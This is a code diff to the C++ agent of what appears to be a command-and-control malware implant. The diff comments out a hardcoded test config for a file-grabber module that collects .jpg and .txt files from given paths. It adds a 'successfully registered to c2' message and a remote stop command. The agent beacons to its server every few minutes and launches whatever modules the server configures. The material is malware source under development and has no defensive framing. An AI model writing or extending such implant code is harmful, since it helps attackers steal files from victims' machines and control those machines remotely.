@@ -2,28 +2,28 @@
 
 void Agent::start()
 {
-    std::string json_string = R"(
-    {
-        "FILE_GRABBER": 
-        {
-            "1337": 
-            {
-            "start_path": "/tmp/aa",
-            "files": [".*.jpg", ".*\\.txt$"]
-            },
-            "1338": 
-            {
-                "start_path": "/tmp/gg",
-                "files": [".*abcd"]
-            },
-            "restart": "1"
-        }
-    }
-    )";
+    // std::string json_string = R"(
+    // {
+    //     "FILE_GRABBER": 
+    //     {
+    //         "1337": 
+    //         {
+    //         "start_path": "/tmp/aa",
+    //         "files": [".*.jpg", ".*\\.txt$"]
+    //         },
+    //         "1338": 
+    //         {
+    //             "start_path": "/tmp/gg",
+    //             "files": [".*abcd"]
+    //         },
+    //         "restart": "1"
+    //     }
+    // }
+    // )";
     
-    json config = json::parse(json_string);
-    start_from_config(config);
-    sleep(60 * 10);
+    // json config = json::parse(json_string);
+    // start_from_config(config);
+    // sleep(60 * 10);
 
     unsigned tries = 0;
 
@@ -38,10 +38,18 @@ void Agent::start()
         sleep(5);
     }
     
+    std::cout << "successfully registered to c2" << std::endl;
+
     while (agent_run)
     {
         if(get_server_config())
         {
+            if (config.contains("stop") && config["stop"] == "1")
+            {
+                stop();
+                break;
+            }
+            
             start_from_config(config);
         }
         sleep(60 * 5);
@@ -55,4 +63,5 @@ void Agent::stop()
     {
         t->stop();
     } 
+    agent_run = false;
 }
